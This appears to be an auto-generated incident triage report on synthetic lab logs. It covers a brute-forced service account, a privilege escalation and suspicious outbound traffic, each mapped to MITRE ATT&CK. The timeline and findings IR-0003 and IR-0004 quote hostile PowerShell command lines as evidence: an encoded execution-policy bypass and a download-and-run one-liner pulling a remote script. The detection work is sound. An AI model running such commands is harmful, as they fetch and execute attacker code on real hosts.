# Incident Triage Notes

Dataset: sample JSON/CSV lab logs
Purpose: SIEM-style alert triage and timeline review

## Executive Summary

- Total findings: 11
- Highest severity: High
- Severity breakdown: High: 7, Medium: 4

## Timeline Reconstruction

- 2026-05-10T18:55:10+00:00 [auth] host=WS-101 user=alice src=10.10.5.20 - 4624 logon success (Normal workstation login)
- 2026-05-10T18:56:03+00:00 [endpoint] host=WS-101 user=alice src= - 4688 process=chrome.exe parent=explorer.exe command=C:\Program Files\Google\Chrome\Application\chrome.exe
- 2026-05-10T18:57:01+00:00 [network] host=WS-101 user= src=10.10.5.20 - allow TCP to 203.0.113.10:443 bytes_out=10240 category=web dns=updates.example
- 2026-05-10T20:01:08+00:00 [auth] host=SRV-DC01 user=svc-backup src=203.0.113.40 - 4625 logon failure (Bad password)
- 2026-05-10T20:02:14+00:00 [auth] host=SRV-DC01 user=svc-backup src=203.0.113.40 - 4625 logon failure (Bad password)
- 2026-05-10T20:03:01+00:00 [auth] host=SRV-DC01 user=svc-backup src=203.0.113.40 - 4625 logon failure (Bad password)
- 2026-05-10T20:04:33+00:00 [auth] host=SRV-DC01 user=svc-backup src=203.0.113.40 - 4625 logon failure (Bad password)
- 2026-05-10T20:05:21+00:00 [auth] host=SRV-DC01 user=svc-backup src=203.0.113.40 - 4625 logon failure (Bad password)
- 2026-05-10T20:07:02+00:00 [auth] host=SRV-DC01 user=svc-backup src=203.0.113.40 - 4624 logon success (Successful login after failures)
- 2026-05-10T20:07:09+00:00 [auth] host=SRV-DC01 user=svc-backup src=203.0.113.40 - 4672 privilege success (Special privileges assigned to new logon)
- 2026-05-10T20:08:30+00:00 [endpoint] host=SRV-DC01 user=svc-backup src= - 4688 process=powershell.exe parent=cmd.exe command=powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkA
- 2026-05-10T20:09:05+00:00 [endpoint] host=SRV-DC01 user=svc-backup src= - 4688 process=whoami.exe parent=powershell.exe command=whoami /priv
- 2026-05-10T20:09:41+00:00 [network] host=SRV-DC01 user= src=10.10.0.10 - allow TCP to 203.0.113.99:443 bytes_out=89120 category=cloud-storage dns=backup-storage.example
- 2026-05-11T01:16:42+00:00 [auth] host=WS-104 user=bob src=198.51.100.23 - 4624 logon success (VPN remote desktop session)
- 2026-05-11T01:18:03+00:00 [auth] host=SRV-DC01 user=bob src=198.51.100.23 - 4728 account_change success (User added to privileged group)
- 2026-05-11T01:20:18+00:00 [endpoint] host=WS-104 user=bob src= - 4688 process=powershell.exe parent=explorer.exe command=powershell.exe -WindowStyle Hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')
- 2026-05-11T01:21:04+00:00 [network] host=WS-104 user= src=10.10.5.34 - allow TCP to 198.51.100.77:4444 bytes_out=145232 category=unknown dns=
- 2026-05-11T01:22:19+00:00 [network] host=WS-104 user= src=10.10.5.34 - allow TCP to 198.51.100.77:8080 bytes_out=84212 category=unknown dns=cdn-cache.example
- 2026-05-11T08:10:02+00:00 [auth] host=WS-102 user=carol src=10.10.5.51 - 4625 logon failure (Mistyped password)
- 2026-05-11T08:11:14+00:00 [auth] host=WS-102 user=carol src=10.10.5.51 - 4624 logon success (Normal login after single failure)
- 2026-05-11T08:15:00+00:00 [endpoint] host=WS-102 user=carol src= - 4688 process=powershell.exe parent=explorer.exe command=powershell.exe Get-Process
- 2026-05-11T08:20:07+00:00 [network] host=WS-102 user= src=10.10.5.51 - allow TCP to 203.0.113.22:443 bytes_out=2234 category=business dns=hr-portal.example

## Findings

### IR-0001: Brute-force authentication attempts

Severity: Medium
Time: 2026-05-10T20:05:21+00:00
Affected user: svc-backup
Affected host: SRV-DC01
Source IP: 203.0.113.40

Description:

5 failed logons for user svc-backup from 203.0.113.40 within 10 minutes.

MITRE ATT&CK Mapping:

- T1110 - Brute Force

Indicators:

- user=svc-backup
- source_ip=203.0.113.40
- event_id=4625

Evidence:

- first_failure=2026-05-10T20:01:08+00:00
- last_failure=2026-05-10T20:05:21+00:00
- failure_count=5
- hosts=SRV-DC01

Escalation Decision:

Review in the analyst queue and escalate if the activity is not tied to expected user or admin behavior.

False-Positive Considerations:

- Service account password rotation or expired credentials can create repeated failures.
- Validate whether the source IP belongs to a known scanner, VPN, or admin jump host.

Recommended Next Steps:

- Review source IP reputation and ownership.
- Check whether the targeted account had a recent password change.
- Look for a successful login from the same source after the failures.

### IR-0002: Successful login after repeated failures

Severity: High
Time: 2026-05-10T20:07:02+00:00
Affected user: svc-backup
Affected host: SRV-DC01
Source IP: 203.0.113.40

Description:

Successful login for svc-backup after 5 failed attempts from 203.0.113.40.

MITRE ATT&CK Mapping:

- T1078 - Valid Accounts
- T1110 - Brute Force

Indicators:

- user=svc-backup
- source_ip=203.0.113.40
- event_id_sequence=4625->4624

Evidence:

- success_time=2026-05-10T20:07:02+00:00
- prior_failure_count=5
- first_failure=2026-05-10T20:01:08+00:00
- logon_type=Network

Escalation Decision:

Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.

False-Positive Considerations:

- A legitimate user may mistype a password several times before succeeding.
- Risk increases when the source IP is external or unusual for the account.

Recommended Next Steps:

- Confirm whether the account owner performed the login.
- Review MFA, VPN, and identity provider logs for the same time window.
- Check endpoint and network activity immediately after the successful login.

### IR-0003: Suspicious PowerShell execution

Severity: High
Time: 2026-05-10T20:08:30+00:00
Affected user: svc-backup
Affected host: SRV-DC01
Source IP: N/A

Description:

PowerShell command on SRV-DC01 used suspicious execution flags or download/encoding behavior.

MITRE ATT&CK Mapping:

- T1059.001 - PowerShell
- T1027 - Obfuscated Files or Information

Indicators:

- host=SRV-DC01
- user=svc-backup
- process=powershell.exe
- parent_process=cmd.exe

Evidence:

- event_id=4688
- command_line=powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkA
- sha256=7b3c2ef9d4bd9b33fc21675f933ad91ad31a92a0e132bd97d4be000000000000

Escalation Decision:

Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.

False-Positive Considerations:

- Administrators may use PowerShell with encoded commands for automation.
- Compare parent process, user, and host role against known administrative workflows.

Recommended Next Steps:

- Decode encoded PowerShell content if present.
- Collect process tree, script block logs, and related command history.
- Check for network connections or file writes following this execution.

### IR-0004: Suspicious PowerShell execution

Severity: High
Time: 2026-05-11T01:20:18+00:00
Affected user: bob
Affected host: WS-104
Source IP: N/A

Description:

PowerShell command on WS-104 used suspicious execution flags or download/encoding behavior.

MITRE ATT&CK Mapping:

- T1059.001 - PowerShell
- T1027 - Obfuscated Files or Information

Indicators:

- host=WS-104
- user=bob
- process=powershell.exe
- parent_process=explorer.exe

Evidence:

- event_id=4688
- command_line=powershell.exe -WindowStyle Hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')
- sha256=985ee6c50f7a7f473d7d1111111111111111111111111111111111111111111

Escalation Decision:

Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.

False-Positive Considerations:

- Administrators may use PowerShell with encoded commands for automation.
- Compare parent process, user, and host role against known administrative workflows.

Recommended Next Steps:

- Decode encoded PowerShell content if present.
- Collect process tree, script block logs, and related command history.
- Check for network connections or file writes following this execution.

### IR-0005: After-hours successful login

Severity: Medium
Time: 2026-05-10T18:55:10+00:00
Affected user: alice
Affected host: WS-101
Source IP: 10.10.5.20

Description:

Successful Interactive login outside the configured business window in Europe/Warsaw.

MITRE ATT&CK Mapping:

- T1078 - Valid Accounts

Indicators:

- user=alice
- host=WS-101
- source_ip=10.10.5.20
- local_time=2026-05-10T20:55:10+02:00

Evidence:

- event_id=4624
- utc_time=2026-05-10T18:55:10+00:00
- logon_type=Interactive
- details=Normal workstation login

Escalation Decision:

Review in the analyst queue and escalate if the activity is not tied to expected user or admin behavior.

False-Positive Considerations:

- On-call, maintenance, backup, and international user activity may be legitimate.
- Validate the user's normal schedule and approved change windows.

Recommended Next Steps:

- Confirm whether the activity matches an approved work schedule.
- Review geolocation, VPN, and MFA context for the source.
- Correlate with endpoint process and network activity after login.

### IR-0006: After-hours successful login

Severity: High
Time: 2026-05-10T20:07:02+00:00
Affected user: svc-backup
Affected host: SRV-DC01
Source IP: 203.0.113.40

Description:

Successful Network login outside the configured business window in Europe/Warsaw.

MITRE ATT&CK Mapping:

- T1078 - Valid Accounts

Indicators:

- user=svc-backup
- host=SRV-DC01
- source_ip=203.0.113.40
- local_time=2026-05-10T22:07:02+02:00

Evidence:

- event_id=4624
- utc_time=2026-05-10T20:07:02+00:00
- logon_type=Network
- details=Successful login after failures

Escalation Decision:

Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.

False-Positive Considerations:

- On-call, maintenance, backup, and international user activity may be legitimate.
- Validate the user's normal schedule and approved change windows.

Recommended Next Steps:

- Confirm whether the activity matches an approved work schedule.
- Review geolocation, VPN, and MFA context for the source.
- Correlate with endpoint process and network activity after login.

### IR-0007: After-hours successful login

Severity: High
Time: 2026-05-11T01:16:42+00:00
Affected user: bob
Affected host: WS-104
Source IP: 198.51.100.23

Description:

Successful RemoteInteractive login outside the configured business window in Europe/Warsaw.

MITRE ATT&CK Mapping:

- T1078 - Valid Accounts

Indicators:

- user=bob
- host=WS-104
- source_ip=198.51.100.23
- local_time=2026-05-11T03:16:42+02:00

Evidence:

- event_id=4624
- utc_time=2026-05-11T01:16:42+00:00
- logon_type=RemoteInteractive
- details=VPN remote desktop session

Escalation Decision:

Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.

False-Positive Considerations:

- On-call, maintenance, backup, and international user activity may be legitimate.
- Validate the user's normal schedule and approved change windows.

Recommended Next Steps:

- Confirm whether the activity matches an approved work schedule.
- Review geolocation, VPN, and MFA context for the source.
- Correlate with endpoint process and network activity after login.

### IR-0008: Privilege or account administration event

Severity: Medium
Time: 2026-05-10T20:07:09+00:00
Affected user: svc-backup
Affected host: SRV-DC01
Source IP: 203.0.113.40

Description:

Privilege-related Windows event 4672 observed for svc-backup on SRV-DC01.

MITRE ATT&CK Mapping:

- T1098 - Account Manipulation

Indicators:

- user=svc-backup
- host=SRV-DC01
- event_id=4672
- privilege=SeDebugPrivilege;SeBackupPrivilege

Evidence:

- time=2026-05-10T20:07:09+00:00
- event_type=privilege
- details=Special privileges assigned to new logon

Escalation Decision:

Review in the analyst queue and escalate if the activity is not tied to expected user or admin behavior.

False-Positive Considerations:

- Domain administrators and service accounts may legitimately receive special privileges.
- Group membership changes may be expected during onboarding or maintenance windows.

Recommended Next Steps:

- Verify change ticket or administrator approval.
- Review group membership history for the affected account.
- Check for suspicious activity before and after the privilege event.

### IR-0009: Privilege or account administration event

Severity: High
Time: 2026-05-11T01:18:03+00:00
Affected user: bob
Affected host: SRV-DC01
Source IP: 198.51.100.23

Description:

Privilege-related Windows event 4728 observed for bob on SRV-DC01.

MITRE ATT&CK Mapping:

- T1098 - Account Manipulation

Indicators:

- user=bob
- host=SRV-DC01
- event_id=4728
- privilege=Domain Admins

Evidence:

- time=2026-05-11T01:18:03+00:00
- event_type=account_change
- details=User added to privileged group

Escalation Decision:

Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.

False-Positive Considerations:

- Domain administrators and service accounts may legitimately receive special privileges.
- Group membership changes may be expected during onboarding or maintenance windows.

Recommended Next Steps:

- Verify change ticket or administrator approval.
- Review group membership history for the affected account.
- Check for suspicious activity before and after the privilege event.

### IR-0010: Suspicious outbound network activity

Severity: High
Time: 2026-05-11T01:21:04+00:00
Affected user: N/A
Affected host: WS-104
Source IP: 10.10.5.34

Description:

Outbound connection from WS-104 to 198.51.100.77:4444 categorized as unknown.

MITRE ATT&CK Mapping:

- T1071 - Application Layer Protocol
- T1105 - Ingress Tool Transfer

Indicators:

- source_ip=10.10.5.34
- dest_ip=198.51.100.77
- dest_port=4444
- dns_query=

Evidence:

- time=2026-05-11T01:21:04+00:00
- protocol=TCP
- action=allow
- bytes_out=145232
- category=unknown

Escalation Decision:

Escalate for analyst review and correlate with identity, endpoint, and network logs before containment.

False-Positive Considerations:

- Unusual ports may be used by legitimate internal tools or development services.
- Documentation IP ranges in this lab represent placeholders, not real bad infrastructure.

Recommended Next Steps:

- Identify the process responsible for the connection.
- Check DNS, proxy, and endpoint telemetry around the same timestamp.
- Block or monitor the destination if it is not business-approved.

### IR-0011: Suspicious outbound network activity

Severity: Medium
Time: 2026-05-11T01:22:19+00:00
Affected user: N/A
Affected host: WS-104
Source IP: 10.10.5.34

Description:

Outbound connection from WS-104 to 198.51.100.77:8080 categorized as unknown.

MITRE ATT&CK Mapping:

- T1071 - Application Layer Protocol
- T1105 - Ingress Tool Transfer

Indicators:

- source_ip=10.10.5.34
- dest_ip=198.51.100.77
- dest_port=8080
- dns_query=cdn-cache.example

Evidence:

- time=2026-05-11T01:22:19+00:00
- protocol=TCP
- action=allow
- bytes_out=84212
- category=unknown

Escalation Decision:

Review in the analyst queue and escalate if the activity is not tied to expected user or admin behavior.

False-Positive Considerations:

- Unusual ports may be used by legitimate internal tools or development services.
- Documentation IP ranges in this lab represent placeholders, not real bad infrastructure.

Recommended Next Steps:

- Identify the process responsible for the connection.
- Check DNS, proxy, and endpoint telemetry around the same timestamp.
- Block or monitor the destination if it is not business-approved.
